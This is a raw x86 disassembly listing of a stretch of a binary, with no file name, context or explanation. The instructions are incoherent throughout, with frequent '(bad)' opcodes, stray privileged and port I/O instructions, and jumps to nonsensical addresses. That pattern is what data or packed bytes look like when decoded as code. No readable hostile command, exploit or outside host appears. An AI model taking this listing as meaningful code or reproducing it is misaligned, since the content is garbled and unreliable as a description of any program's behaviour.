  4037b6:	xor    ch,BYTE PTR ds:0xf9c6cb39
  4037bc:	mov    ch,0xb0
  4037be:	inc    esp
  4037bf:	mul    DWORD PTR [ebx-0x91e8786]
  4037c5:	sbb    DWORD PTR [ebx-0x5523889a],ebx
  4037cb:	fsub   QWORD PTR [edi-0x2fdd6117]
  4037d1:	mov    BYTE PTR [ebx-0x18],bl
  4037d4:	dec    edx
  4037d5:	arpl   WORD PTR [ebp-0x21],sp
  4037d8:	repz jge 0x40380f
  4037db:	dec    esp
  4037dc:	data16 aas 
  4037de:	mov    WORD PTR [edx+0x64511e51],ss
  4037e4:	pop    ss
  4037e5:	jae    0x4037ca
  4037e7:	xchg   ebp,eax
  4037e8:	xchg   esi,eax
  4037e9:	sub    ch,BYTE PTR [edx+0x58]
  4037ec:	pushf  
  4037ed:	loop   0x403798
  4037ef:	mov    ds:0xb454b2a1,eax
  4037f4:	push   cs
  4037f5:	jge    0x4037c0
  4037f7:	(bad)  
  4037f8:	into   
  4037f9:	sbb    al,0xa5
  4037fb:	mov    ecx,0xcc0e72fe
  403800:	and    BYTE PTR [ecx-0x36],cl
  403803:	hlt    
  403804:	push   esp
  403805:	es mov esp,0x30f42c93
  40380b:	sub    eax,0x5331cdfc
  403810:	dec    DWORD PTR [eax]
  403812:	push   eax
  403813:	cs or  eax,0xccc5862b
  403819:	xchg   esp,eax
  40381a:	mov    bh,0x6f
  40381c:	push   0x38482676
  403821:	push   ebp
  403822:	mov    cl,0xf2
  403824:	mov    ds:0xcc7cff70,eax
  403829:	daa    
  40382a:	mov    bh,0x43
  40382c:	inc    edi
  40382d:	test   DWORD PTR [edi],ebp
  40382f:	into   
  403830:	sti    
  403831:	or     al,0xb3
  403833:	into   
  403834:	add    al,0x2c
  403836:	mov    dh,bh
  403838:	(bad)  
  403839:	and    eax,0x5e2e984a
  40383e:	mov    ch,0x99
  403840:	jecxz  0x4038bc
  403842:	imul   ebp,DWORD PTR [eax-0xa891a1c],0xcacbea28
  40384c:	mov    esi,0xd03ccb55
  403851:	adc    al,0xd4
  403853:	cli    
  403854:	imul   eax,DWORD PTR [edx+ebx*1],0xffffffa3
  403858:	cmp    ebp,DWORD PTR [edi-0x7ab08099]
  40385e:	xor    esi,DWORD PTR [edi+ebp*1]
  403861:	inc    ebp
  403862:	or     dl,bl
  403864:	pop    esp
  403865:	adc    edi,ebx
  403867:	xchg   ecx,eax
  403868:	sti    
  403869:	shl    eax,cl
  40386b:	pop    ebp
  40386c:	(bad)  
  40386d:	repz pushf 
  40386f:	stos   BYTE PTR es:[edi],al
  403870:	test   eax,0x599ed829
  403875:	mov    dh,0x6d
  403877:	stos   DWORD PTR es:[edi],eax
  403878:	sub    eax,0xa199a1b7
  40387d:	stos   DWORD PTR es:[edi],eax
  40387e:	or     eax,0xd36fe59f
  403883:	cli    
  403884:	lods   eax,DWORD PTR ds:[esi]
  403885:	rcl    BYTE PTR [edi],1
  403887:	lock pop es
  403889:	imul   edx,DWORD PTR [eax-0x34],0xffffffbf
  40388d:	sbb    eax,0x9e891f6d
  403892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403893:	dec    ecx
  403894:	daa    
  403895:	fistp  WORD PTR [ebx-0x2ef7e7bc]
  40389b:	mov    esp,0x1bd4f6a1
  4038a0:	lea    ecx,[esi]
  4038a2:	dec    esp
  4038a3:	xchg   BYTE PTR [ecx],ah
  4038a5:	inc    esp
  4038a6:	les    esp,FWORD PTR [eax]
  4038a8:	inc    ecx
  4038a9:	stos   DWORD PTR es:[edi],eax
  4038aa:	(bad)  
  4038ab:	rcl    al,0xcd
  4038ae:	aad    0x10
  4038b0:	repnz loope 0x4038de
  4038b3:	dec    ecx
  4038b4:	xchg   ah,dl
  4038b6:	pop    ss
  4038b7:	(bad)  
  4038b8:	mov    esp,0x646a0532
  4038bd:	mov    ecx,0x91ee87f3
  4038c2:	jge    0x403900
  4038c4:	imul   edx,DWORD PTR [ebp+ebx*1-0x57],0xffffff9d
  4038c9:	call   FWORD PTR [ebx]
  4038cb:	cwde   
  4038cc:	and    bh,BYTE PTR [ecx-0x71]
  4038cf:	out    0x96,eax
  4038d1:	(bad)  
  4038d2:	push   ds
  4038d3:	cmp    BYTE PTR [esi],cl
  4038d5:	imul   esp,DWORD PTR [ebx],0x3ac7bc27
  4038db:	stc    
  4038dc:	inc    edx
  4038dd:	xchg   al,ah
  4038df:	outs   dx,DWORD PTR ds:[esi]
  4038e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e1:	cmp    ah,al
  4038e3:	(bad)  
  4038e4:	sbb    ch,ah
  4038e6:	ror    ebx,cl
  4038e8:	fldlg2 
  4038ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038eb:	cmp    eax,0x70c1b900
  4038f0:	sub    DWORD PTR [esi-0x7b371010],ecx
  4038f6:	jl     0x403915
  4038f8:	mov    dl,0x6
  4038fa:	mov    bl,0xa8
  4038fc:	dec    eax
  4038fd:	sub    BYTE PTR [eax+0x49],bh
  403900:	add    eax,DWORD PTR [ebx]
  403902:	jae    0x4038c9
  403904:	sar    dl,1
  403906:	jmp    0xd89bf31c
  40390b:	mov    ch,0xb0
  40390d:	pop    eax
  40390e:	pand   mm0,mm4
  403911:	jnp    0x403968
  403913:	mov    dh,0x74
  403915:	pop    es
  403916:	(bad)  
  403918:	add    dh,BYTE PTR [ebp-0x27]
  40391b:	mov    cl,0xdc
  40391d:	retf   
  40391e:	adc    DWORD PTR [ecx],edi
  403920:	test   BYTE PTR [ebx-0x3a4746e8],ah
  403926:	lods   al,BYTE PTR ds:[esi]
  403927:	push   edx
  403928:	push   cs
  403929:	mov    al,0xdc
  40392b:	cmp    DWORD PTR [edx],eax
  40392d:	mov    ebx,0xdb34183b
  403932:	fcomi  st,st(6)
  403934:	sahf   
  403935:	es loope 0x403942
  403938:	sti    
  403939:	inc    edi
  40393a:	xchg   ebp,eax
  40393b:	outs   dx,DWORD PTR ds:[esi]
  40393c:	cmp    ch,al
  40393e:	mov    eax,0xe7ae9109
  403943:	int    0x4e
  403945:	rol    DWORD PTR [ecx+esi*2],cl
  403948:	lock stos BYTE PTR es:[edi],al
  40394a:	cmp    eax,0x28f64c4a
  40394f:	xchg   BYTE PTR [edi-0x982dc05],bl
  403955:	and    al,0xed
  403957:	imul   eax,DWORD PTR [ebp-0xc71a6aa],0xffffffae
  40395e:	iret   
  40395f:	es mov dh,0xc4
  403962:	(bad)  
  403963:	and    BYTE PTR [edi+0x28673502],dl
  403969:	push   ds
  40396a:	xchg   esi,eax
  40396b:	jg     0x4039e2
  40396d:	test   DWORD PTR [esi],edx
  40396f:	test   DWORD PTR [ebx+0x6f5f0cfd],esi
  403975:	push   edi
  403976:	neg    BYTE PTR [ebx]
  403978:	std    
  403979:	jb     0x40396d
  40397b:	mov    bl,0xe6
  40397d:	in     al,0x72
  40397f:	xor    eax,0xb5c30156
  403984:	scas   al,BYTE PTR es:[edi]
  403985:	sbb    ch,BYTE PTR [ebx-0x28]
  403988:	inc    ecx
  403989:	adc    DWORD PTR ds:0xa68e2f7e,edi
  40398f:	out    0x18,al
  403991:	(bad)
  403995:	mov    BYTE PTR [ebx+0x73],0x91
  403999:	xor    BYTE PTR [ebx+ecx*4+0x7b51ad3b],0xec
  4039a1:	repz mov esi,edx
  4039a4:	pop    ebx
  4039a5:	test   BYTE PTR es:[esi],ch
  4039a8:	adc    eax,0x4e2a4224
  4039ad:	stos   DWORD PTR es:[edi],eax
  4039ae:	test   edx,ebp
  4039b0:	mov    ebp,0x7906b9de
  4039b5:	xchg   ebp,eax
  4039b6:	ret    0x7813
  4039b9:	gs (bad) 
  4039bb:	sub    al,0x67
  4039bd:	data16 or al,0x3d
  4039c0:	test   al,0x11
  4039c2:	scas   al,BYTE PTR es:[edi]
  4039c3:	sub    BYTE PTR ds:0x100fbba7,dh
  4039c9:	lods   al,BYTE PTR ds:[esi]
  4039ca:	rol    DWORD PTR [ebx+ebx*1+0x4a63b6d8],cl
  4039d1:	sub    ah,al
  4039d3:	in     eax,dx
  4039d4:	mov    esp,0x1859e271
  4039d9:	xor    eax,0xe62e5b9a
  4039de:	or     al,0x6d
  4039e0:	cs repnz push ecx
  4039e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039e4:	inc    esi
  4039e5:	mov    edx,0xb402d3fd
  4039ea:	jne    0x40399c
  4039ec:	outs   dx,BYTE PTR ds:[esi]
  4039ed:	adc    eax,0xeedaf5db
  4039f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039f3:	imul   esi,DWORD PTR [eax],0xb
  4039f6:	push   0x780c36e3
  4039fb:	nop
  4039fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039fd:	push   ss
  4039fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039ff:	mov    eax,ds:0xc99526d9
  403a04:	and    eax,DWORD PTR [ebx]
  403a06:	imul   esp,DWORD PTR [eax+0x3bebc4ee],0x2ef281ac
  403a10:	inc    esp
  403a11:	adc    eax,DWORD PTR [eax+0x7c]
  403a14:	aad    0x11
  403a16:	mov    ch,0x16
  403a18:	gs dec edx
  403a1a:	lea    ecx,[edi-0x55b60f3a]
  403a20:	push   esi
  403a21:	arpl   WORD PTR [edi],dx
  403a23:	xchg   edi,eax
  403a24:	in     ax,0x26
  403a27:	popa   
  403a28:	daa    
  403a29:	sti    
  403a2a:	pop    ss
  403a2b:	ss sub eax,0x424a6642
  403a31:	fistp  QWORD PTR [edx]
  403a33:	aaa    
  403a34:	mov    ?,esp
  403a36:	mov    esp,0xc6fd3397
  403a3b:	sti    
  403a3c:	(bad)
  403a3f:	xor    al,0x69
  403a41:	pop    es
  403a42:	sbb    cl,BYTE PTR [ebx]
  403a44:	test   DWORD PTR [eax-0x31],0xa95424e9
  403a4b:	mov    ah,0x81
  403a4d:	das    
  403a4e:	out    0xe1,al
  403a50:	mov    edi,es
  403a52:	and    BYTE PTR [ecx-0x7b],cl
  403a55:	inc    eax
  403a56:	cmp    BYTE PTR [eax-0x26],bh
  403a59:	imul   ebx,DWORD PTR [eax],0xf7485d1b
  403a5f:	push   ds
  403a60:	pop    edx
  403a61:	cmp    DWORD PTR [ebx],ecx
  403a63:	xchg   edx,eax
  403a64:	inc    edx
  403a65:	inc    esp
  403a66:	mov    esp,0x119722b3
  403a6b:	loop   0x403a9a
  403a6d:	(bad)  
  403a6e:	shr    ecx,cl
  403a70:	into   
  403a71:	je     0x4039f4
  403a73:	add    ecx,ebx
  403a75:	gs aam 0x50
  403a78:	push   ss
  403a79:	or     BYTE PTR [edi-0x453dcaa6],cl
  403a7f:	mov    ds:0x28cc48a2,eax
  403a84:	rol    esi,cl
  403a86:	cmp    ebp,ebx
  403a88:	pop    ss
  403a89:	data16 int 0x9d
  403a8c:	pushf  
  403a8d:	sbb    BYTE PTR [edx-0x10],ah
  403a90:	ja     0x403a9b
  403a92:	pop    ebx
  403a93:	clc    
  403a94:	test   eax,0x79ed5eb0
  403a99:	pop    edx
  403a9a:	inc    edx
  403a9b:	or     eax,0x5c35ba
  403aa0:	or     eax,0xffdf3d95
  403aa5:	ja     0x403a3b
  403aa7:	repz xchg ebx,eax
  403aa9:	int3   
  403aaa:	and    ch,BYTE PTR [ebx]
  403aac:	push   esp
  403aad:	pop    esi
  403aae:	pop    esp
  403aaf:	bound  eax,QWORD PTR [edx+ebp*2]
  403ab2:	xchg   edx,eax
  403ab3:	ret    
  403ab4:	outs   dx,BYTE PTR ds:[esi]
  403ab5:	mov    dl,BYTE PTR [ebp+0x23f4222f]
  403abb:	inc    ecx
  403abc:	and    al,0xfe
  403abe:	xor    eax,0x41f2b7a5
  403ac3:	test   BYTE PTR [edx],cl
  403ac5:	mov    ecx,0x8a367e04
  403aca:	popa   
  403acb:	pop    ss
  403acc:	xor    BYTE PTR [eax+0x65],dh
  403acf:	xchg   ecx,eax
  403ad0:	and    BYTE PTR cs:[ebp+0xf],cl
  403ad4:	dec    edx
  403ad6:	push   0xf4875c0a
  403adb:	sub    ebp,DWORD PTR [ebx+eax*4]
  403ade:	cli    
  403adf:	bound  edi,QWORD PTR [edx-0x5a]
  403ae2:	dec    esi
  403ae3:	cmp    esp,esi
  403ae5:	(bad)  
  403ae6:	or     eax,0x6357d0c5
  403aeb:	les    edx,FWORD PTR [edx+0x73]
  403aee:	jmp    0x7f9ca7e
  403af3:	clc    
  403af4:	dec    ebp
  403af5:	sbb    DWORD PTR [edi-0x1c],ebp
  403af8:	out    dx,eax
  403af9:	adc    BYTE PTR [edi+0x8276bee],bl
  403aff:	outs   dx,BYTE PTR ds:[esi]
  403b00:	cwde   
  403b01:	add    al,0x22
  403b03:	push   0xfffffff1
  403b05:	sbb    BYTE PTR [ebx],0xdd
  403b08:	xor    dl,0x91
  403b0b:	test   DWORD PTR ds:0x277671dd,0xe916ca99
  403b15:	(bad)  
  403b16:	mov    ah,0xa3
  403b18:	jp     0x403b98
  403b1a:	ror    DWORD PTR [ebx],cl
  403b1c:	adc    BYTE PTR [edi+0xb3ed53d],0xa1
  403b23:	xchg   edi,eax
  403b24:	push   0x44
  403b26:	lods   eax,DWORD PTR ds:[esi]
  403b27:	pop    ebp
  403b28:	mov    eax,ds:0x7d7334ff
  403b2d:	mov    ds:0xa68966ea,al
  403b32:	clc    
  403b33:	xor    BYTE PTR [esi-0x7f],dh
  403b36:	pop    edi
  403b37:	iret   
  403b38:	push   ebp
  403b39:	es push 0xffffff83
  403b3c:	lods   al,BYTE PTR ds:[esi]
  403b3d:	ja     0x403b52
  403b3f:	dec    edi
  403b40:	aaa    
  403b41:	test   BYTE PTR [edx-0x4303b758],dl
  403b47:	jecxz  0x403baf
  403b49:	xor    BYTE PTR [edx],0xec
  403b4c:	cmp    eax,0xc1735cdb
  403b51:	in     al,0xcd
  403b53:	out    0x4f,eax
  403b55:	xchg   DWORD PTR [ecx+0x5c],ebx
  403b58:	pusha  
  403b59:	xchg   ebx,eax
  403b5a:	jno    0x403b46
  403b5c:	lds    ebp,FWORD PTR [eax]
  403b5e:	mul    DWORD PTR [ebx]
  403b60:	in     eax,0xf7
  403b62:	into   
  403b63:	mov    WORD PTR [eax-0x262dabb0],?
  403b69:	or     ah,BYTE PTR [ebp+0x63]
  403b6c:	pushf  
  403b6d:	xor    al,0x69
  403b6f:	repz adc edx,esp
  403b72:	and    DWORD PTR [ecx+0x7ea2957a],esi
  403b78:	in     eax,0x22
  403b7a:	xchg   esp,eax
  403b7b:	imul   ecx,DWORD PTR [edx-0x2c],0xf39a4eb5
  403b82:	cmp    eax,edi
  403b84:	repz fcom DWORD PTR [ebp+eiz*2-0x12ad3116]
  403b8c:	aas    
  403b8d:	push   0x7
  403b8f:	ja     0x403b40
  403b91:	sti    
  403b92:	fistp  DWORD PTR [ebx+0x2d0c2cf0]
  403b98:	data16 fcomp DWORD PTR [eax]
  403b9b:	daa    
  403b9c:	xor    edi,DWORD PTR [ebx]
  403b9e:	sub    edx,DWORD PTR [edx]
  403ba0:	(bad)  
  403ba1:	jnp    0x403b39
  403ba3:	pop    eax
  403ba4:	pop    esp
  403ba5:	adc    BYTE PTR [ebp+0x7e],bl
  403ba8:	imul   edi,DWORD PTR [ecx+0x53642896],0xf717004e
  403bb2:	mov    dh,0x47
  403bb4:	je     0x403bf6
  403bb6:	adc    DWORD PTR [ebx],0xffffff84
  403bb9:	xor    al,0x36
  403bbb:	mov    dl,0x4b
  403bbd:	adc    al,0x67
  403bbf:	les    edi,FWORD PTR [ecx+0x16]
  403bc2:	jle    0x403b87
  403bc4:	dec    eax
  403bc5:	adc    BYTE PTR [eax],dh
  403bc7:	xor    DWORD PTR [ebp+ecx*1-0x16],esi
  403bcb:	sub    eax,0x799529e4
  403bd0:	fistp  QWORD PTR gs:[eax-0x17413560]
  403bd7:	pushf  
  403bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bda:	popf   
  403bdb:	jl     0x403bc2
  403bdd:	and    cl,BYTE PTR [esi-0x4a]
  403be0:	aas    
  403be1:	call   0x7a8e:0x828de2ae
  403be8:	test   BYTE PTR [edx-0x2e],bh
  403beb:	pushf  
  403bec:	xlat   BYTE PTR ds:[ebx]
  403bed:	test   BYTE PTR [edx],ch
  403bef:	jns    0x403c52
  403bf1:	push   ebp
  403bf2:	inc    ecx
  403bf3:	out    dx,al
  403bf4:	cmp    esi,DWORD PTR [edx]
  403bf6:	loopne 0x403c76
  403bf8:	mov    ah,0x48
  403bfa:	cmp    al,ch
  403bfc:	push   esi
  403bfd:	mov    esi,0x88d88319
  403c02:	jg     0x403c0b
  403c04:	add    eax,0x224ef44e
  403c09:	mov    dl,0x75
  403c0b:	loopne 0x403bfe
  403c0d:	mov    esi,0xbf9947d9
  403c12:	(bad)  
  403c13:	mov    cl,0xbe
  403c15:	mov    dh,0xbc
  403c17:	adc    dl,BYTE PTR [edx-0x67]
  403c1a:	fisttp DWORD PTR [edi-0x4]
  403c1d:	sub    al,0xd
  403c1f:	addr16 dec esi
  403c21:	mov    edx,0xd2d08e8b
  403c26:	ja     0x403bac
  403c28:	test   DWORD PTR [edi-0x1f],0xd58f975a
  403c2f:	mov    WORD PTR [esi+0x68],es
  403c32:	stc    
  403c33:	cmp    al,0xca
  403c35:	xlat   BYTE PTR ds:[ebx]
  403c36:	pop    ds
  403c37:	adc    BYTE PTR [edx+0x4abfc1e7],ch
  403c3d:	in     al,0xb4
  403c3f:	outs   dx,BYTE PTR ds:[esi]
  403c40:	mov    dh,0x13
  403c42:	aaa    
  403c43:	enter  0x5df7,0xc4
  403c47:	push   ebp
  403c48:	push   ss
  403c49:	jle    0x403c3e
  403c4b:	std    
  403c4c:	pop    ecx
  403c4d:	pop    ss
  403c4e:	fcmovnbe st,st(5)
  403c50:	aaa    
  403c51:	sbb    al,0xa7
  403c53:	pop    ss
  403c54:	adc    BYTE PTR [edx],dh
  403c56:	jns    0x403ca5
  403c58:	adc    BYTE PTR [edi],dh
  403c5a:	jo     0x403cbc
  403c5c:	dec    ebx
  403c5d:	push   edx
  403c5e:	xor    ch,BYTE PTR [ebp-0x15]
  403c61:	call   0x92ac9b42
  403c66:	jb     0x403c44
  403c68:	lock fninit 
  403c6b:	jb     0x403c07
  403c6d:	test   BYTE PTR [esp+esi*2+0xd],bl
  403c71:	out    dx,eax
  403c72:	xchg   ecx,eax
  403c73:	and    ah,BYTE PTR [ebx-0x45]
  403c76:	mov    ds:0x8f4073d3,eax
  403c7b:	retf   
  403c7c:	push   ebx
  403c7d:	ret    
  403c7e:	add    al,0x6b
  403c80:	(bad)  
  403c81:	sti    
  403c82:	loope  0x403c53
  403c84:	repz sub cl,ch
  403c87:	je     0x403ce7
  403c89:	add    eax,0xa8613b9a
  403c8e:	int3   
  403c8f:	sub    BYTE PTR [ebx+0x33],ch
  403c92:	daa    
  403c93:	fisttp WORD PTR [eax+0x73]
  403c96:	push   ss
  403c97:	inc    esp
  403c98:	and    al,0x4c
  403c9a:	mov    edi,0x18c49a98
  403c9f:	or     BYTE PTR [ebx],dl
  403ca1:	mov    ebx,0x6c1d47f8
  403ca6:	es add ch,al
  403ca9:	data16 ins BYTE PTR es:[edi],dx
  403cab:	aad    0x43
  403cad:	push   ss
  403cae:	adc    esi,DWORD PTR [edx]
  403cb0:	aad    0xba
  403cb2:	pop    es
  403cb3:	push   cs
  403cb4:	xlat   BYTE PTR ds:[ebx]
  403cb5:	(bad)
  403cb9:	jecxz  0x403ceb
  403cbb:	mov    bl,0xa9
  403cbd:	in     eax,0x5f
  403cbf:	pop    edi
  403cc0:	pop    edi
  403cc1:	clc    
  403cc2:	adc    DWORD PTR [esi+0x14da5897],ebx
  403cc8:	pop    eax
  403cc9:	stc    
  403cca:	bound  edx,QWORD PTR [ebx+0x2ebf3de0]
  403cd0:	jb     0x403cdf
  403cd2:	fld    DWORD PTR [ebp+0x77]
  403cd5:	rcl    DWORD PTR [ebx],1
  403cd7:	sub    ch,0x4f
  403cda:	xchg   ecx,eax
  403cdb:	mov    cs,edx
  403cdd:	(bad)  
  403cde:	mov    edi,0x847ceb56
  403ce3:	mov    ch,dh
  403ce5:	loopne 0x403c91
  403ce7:	xchg   edx,eax
  403ce8:	cmp    ebp,ebx
  403cea:	dec    esi
  403ceb:	cmp    DWORD PTR [edx],esi
  403ced:	icebp  
  403cee:	dec    ebp
  403cef:	loopne 0x403cb3
  403cf1:	ret    0x9e8
  403cf4:	and    al,0x97
  403cf6:	add    BYTE PTR [eax-0x49dc45ac],dh
  403cfc:	aad    0x27
  403cfe:	and    edx,DWORD PTR [ebx-0x251fcdc2]
  403d04:	and    eax,0xdb23b6b7
  403d09:	push   ecx
  403d0a:	push   esi
  403d0b:	(bad)  
  403d0c:	xor    DWORD PTR [edi+0x423e7366],ecx
  403d12:	dec    edx
  403d13:	jecxz  0x403d87
  403d15:	inc    edx
  403d16:	or     DWORD PTR [edi-0x3f261805],edi
  403d1c:	push   ebx
  403d1d:	or     ah,BYTE PTR ds:0x83e0932a
  403d23:	sub    eax,0xf01b3547
  403d28:	and    ebx,DWORD PTR [eax-0x5c]
  403d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d2c:	or     esp,DWORD PTR [esi]
  403d2e:	mov    ecx,0x7923256e
  403d33:	inc    edx
  403d34:	out    dx,al
  403d35:	fisttp WORD PTR [ebp+0x1c7732fb]
  403d3b:	xor    edx,0x7a8892ad
  403d41:	icebp  
  403d42:	cld    
  403d43:	mov    ds:0x9253a5b5,al
  403d48:	push   0x6a908427
  403d4d:	cli    
  403d4e:	fs ret 0x919f
  403d52:	ret    
  403d53:	mov    bh,0xc1
  403d55:	icebp  
  403d56:	ins    DWORD PTR es:[edi],dx
  403d57:	pop    ebp
  403d58:	das    
  403d59:	pushf  
  403d5a:	jb     0x403d0c
  403d5c:	push   cs
  403d5d:	jno    0x403d32
  403d5f:	xchg   esi,eax
  403d60:	stos   BYTE PTR es:[edi],al
  403d61:	in     eax,dx
  403d62:	xchg   esp,eax
  403d63:	jb     0x403d9b
  403d65:	dec    esi
  403d66:	mov    BYTE PTR [eax+0x2c],bh
  403d69:	mov    ebp,0xd6a0b127
  403d6e:	gs loopne 0x403d2c
  403d71:	inc    esp
  403d72:	sbb    BYTE PTR [esi+0x4],ah
  403d75:	sub    BYTE PTR [edx],al
  403d77:	(bad)  
  403d79:	dec    ebp
  403d7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d7b:	add    dl,BYTE PTR [ebx]
  403d7d:	gs int 0xd4
  403d80:	sub    cl,al
  403d82:	retf   
  403d83:	(bad)  
  403d84:	aam    0x2c
  403d86:	jg     0x403d1a
  403d88:	jnp    0x403d13
  403d8a:	mov    ebp,edi
  403d8c:	ficomp DWORD PTR [esi]
  403d8e:	sub    bh,BYTE PTR [ecx+0x7a4fcac1]
  403d94:	int    0x80
  403d96:	cmp    eax,0x757fc3b2
  403d9b:	pop    esp
  403d9c:	xor    BYTE PTR [edi+0x41f6c858],0x2d
  403da3:	(bad)  
  403da4:	bound  edx,QWORD PTR [edi+esi*8-0x14]
  403da8:	push   ss
  403da9:	shl    DWORD PTR [edi-0x732e8982],cl
  403daf:	pop    esp
  403db0:	int    0xc5
  403db2:	and    eax,0x25aa3602
  403db7:	push   eax
  403db8:	ins    DWORD PTR es:[edi],dx
  403db9:	sub    al,0x2f
  403dbb:	(bad)  
  403dbc:	mov    ah,BYTE PTR ds:0xd2e8a508
  403dc2:	es sub edi,ebx
  403dc5:	mov    ch,BYTE PTR [ecx+0x6948bc19]
  403dcb:	(bad)  
  403dcc:	jecxz  0x403e20
  403dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dcf:	mov    ds:0x8bd262d,al
  403dd4:	(bad)  
  403dd6:	fdiv   QWORD PTR [ebx]
  403dd8:	push   ds
  403dd9:	loopne 0x403daa
  403ddb:	jmp    0xc95:0x72201756
  403de2:	jle    0x403df1
  403de4:	add    DWORD PTR [ebp+0x38e16411],ebp
  403dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dec:	add    ecx,DWORD PTR [esi]
  403dee:	shr    BYTE PTR [eax-0x4e],cl
  403df1:	inc    esi
  403df2:	das    
  403df3:	out    0x8e,eax
  403df5:	cmp    ah,BYTE PTR [edi-0x7f821c5c]
  403dfb:	sub    eax,0x8474467d
  403e00:	fcmovnbe st,st(3)
  403e02:	(bad)  [eax]
  403e04:	jbe    0x403e7a
  403e06:	ds in  al,dx
  403e08:	pop    eax
  403e09:	mov    cl,0x74
  403e0b:	iret   
  403e0c:	mov    eax,0x88f109c8
  403e11:	lahf   
  403e12:	fisttp WORD PTR [esi-0x6a]
  403e15:	mov    WORD PTR [esi+0x67f4c4ee],es
  403e1b:	ret    0x2f5b
  403e1e:	push   edi
  403e1f:	test   al,0xe7
  403e21:	out    dx,eax
  403e22:	push   eax
  403e23:	inc    ebx
  403e24:	add    BYTE PTR [esi],bh
  403e26:	(bad)  
  403e27:	jg     0x403ddf
  403e29:	sub    bh,BYTE PTR [esi-0x53]
  403e2c:	mov    bh,0x9e
  403e2e:	inc    eax
  403e2f:	(bad)  
  403e30:	int3   
  403e31:	or     BYTE PTR [edi],bh
  403e33:	sub    ebp,DWORD PTR [esi]
  403e35:	cmp    DWORD PTR [edx+0x2b],0xffffffab
  403e39:	inc    edi
  403e3a:	dec    edi
  403e3b:	jp     0x403e87
  403e3d:	or     dh,BYTE PTR [ecx+0x433f0c28]
  403e43:	and    edi,DWORD PTR ds:0x284f68b6
  403e49:	push   ds
  403e4a:	imul   esp,DWORD PTR [edi+0x7f],0x32
  403e4e:	push   es
  403e4f:	sbb    BYTE PTR [ebp+0x39bc70d6],dl
  403e55:	mov    esp,gs
  403e57:	mov    ah,0x8
  403e59:	cmp    edi,DWORD PTR [edi]
  403e5b:	adc    dl,BYTE PTR [eax-0x6f]
  403e5e:	sbb    al,0xbc
  403e60:	jb     0x403e1b
  403e62:	cmc    
  403e63:	and    eax,0x87aef633
  403e68:	mov    edi,DWORD PTR [esi-0x3b451d17]
  403e6e:	sub    al,0xfd
  403e70:	or     ah,bh
  403e72:	or     DWORD PTR [edx+0x67a28864],edi
  403e78:	sar    BYTE PTR [edx+0x53],1
  403e7b:	jne    0x403ecb
  403e7d:	jecxz  0x403e63
  403e7f:	sbb    edi,esi
  403e81:	sub    esi,DWORD PTR [ecx-0x70]
  403e84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e85:	adc    ah,BYTE PTR [ecx+edi*2]
  403e88:	or     DWORD PTR [ecx],edx
  403e8a:	pop    cx
  403e8c:	xchg   esp,eax
  403e8d:	stos   BYTE PTR es:[edi],al
  403e8e:	ret    
  403e8f:	cmp    esp,edi
  403e91:	inc    ebx
  403e92:	ins    DWORD PTR es:[edi],dx
  403e93:	pop    eax
  403e94:	adc    eax,0xf6248d1d
  403e99:	mov    esp,0x2023d959
  403e9e:	mov    ds:0x1a4fef4e,eax
  403ea3:	(bad)  
  403ea5:	(bad)  
  403ea7:	sbb    al,BYTE PTR [edi-0x16]
  403eaa:	pusha  
  403eab:	dec    esp
  403eac:	jne    0x403e7e
  403eae:	pop    esi
  403eaf:	lods   al,BYTE PTR ds:[esi]
  403eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb1:	mov    eax,DWORD PTR [ecx-0x7a]
  403eb4:	ins    BYTE PTR es:[edi],dx
  403eb5:	mov    esi,0xf62cd364
  403eba:	jg     0x403edb
  403ebc:	inc    edx
  403ebd:	xor    al,0x6b
  403ebf:	mov    ds:0x8a2abb5e,al
  403ec4:	stos   DWORD PTR es:[edi],eax
  403ec5:	xchg   esp,eax
  403ec6:	xor    DWORD PTR [edx-0x3a917def],0x30
  403ecd:	aas    
  403ece:	jno    0x403f1b
  403ed0:	mov    DWORD PTR [eax+ebp*1+0x6d],0x5c219487
  403ed8:	mov    ah,BYTE PTR ds:0xce819856
  403ede:	ret    
  403edf:	jmp    0xf637:0x3733ff0b
  403ee6:	jnp    0x403f11
  403ee8:	and    ebx,esi
  403eea:	retf   0xc5a5
  403eed:	mov    dl,0x21
  403eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ef0:	and    al,0xe0
  403ef2:	dec    esp
  403ef3:	repz iret 
  403ef5:	imul   eax,DWORD PTR [ebx],0xffffffe3
  403ef8:	dec    esp
  403ef9:	sbb    ecx,ebx
  403efb:	cld    
  403efc:	repnz mov ds:0x8ebd0f42,al
  403f02:	or     ah,BYTE PTR [edx]
  403f04:	in     eax,0x94
  403f06:	xchg   BYTE PTR [edx+0x69],cl
  403f09:	enter  0xca1c,0x44
  403f0d:	out    dx,eax
  403f0e:	jl     0x403ef2
  403f10:	inc    esi
  403f11:	icebp  
  403f12:	test   DWORD PTR [edx+eax*2-0x66],0x18e71f66
  403f1a:	sub    DWORD PTR [ecx+0x62],esi
  403f1d:	arpl   di,si
  403f1f:	cli    
  403f20:	inc    ebp
  403f21:	gs and ebp,esp
  403f24:	mov    DWORD PTR [edx-0x27],edi
  403f27:	mov    esi,0xb846d64
  403f2c:	push   cs
  403f2d:	sbb    al,0x57
  403f2f:	push   ebx
  403f30:	dec    edi
  403f31:	(bad)  
  403f32:	retf   
  403f33:	cmp    al,0x3f
  403f35:	lds    esp,FWORD PTR [edi]
  403f37:	add    al,0xf8
  403f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f3a:	clc    
  403f3b:	ret    
